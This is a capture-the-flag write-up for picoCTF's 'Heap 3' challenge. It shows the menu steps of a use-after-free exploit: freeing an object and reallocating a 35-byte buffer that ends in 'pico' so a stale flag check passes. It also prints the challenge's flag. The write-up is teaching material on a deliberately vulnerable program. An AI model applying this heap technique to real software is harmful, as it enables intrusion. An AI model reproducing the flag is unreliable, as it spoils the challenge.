# Heap 3 #
This is a write-up for [heap 3](https://play.picoctf.org/practice/challange/440).  
`Heap 3` rated medium
The given files are at the `file` directory.  

## The Challenge ##
> This program mishandles memory. Can you exploit it to get the flag?  
> Download the binary [here](./files/binary).  
> Download the source [here](./files/source.c).  
> Connect with the challenge instance here:  
> nc tethys.picoctf.net \<port\>

## How I Solve ## 
To solve this I needed to change the `x->flag` from `bico` to `pico`.  
The way to do this is by freeing the `x` variable and allocate a new object in the same place (if we lucky).  
Lets try it.


Step 1: deleting `x`
```
freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5
```
Step 2: declare a new variable on the same place with 35 chars when the last 5 chars are 'pico\0'
```
1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: 123456789012345678901234567890pico
```

Step 3: try the `win` function
```
1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{now_thats_free_real_estate_a11cf359}
```

We did it! We got that the flag is `picoCTF{now_thats_free_real_estate_a11cf359}`
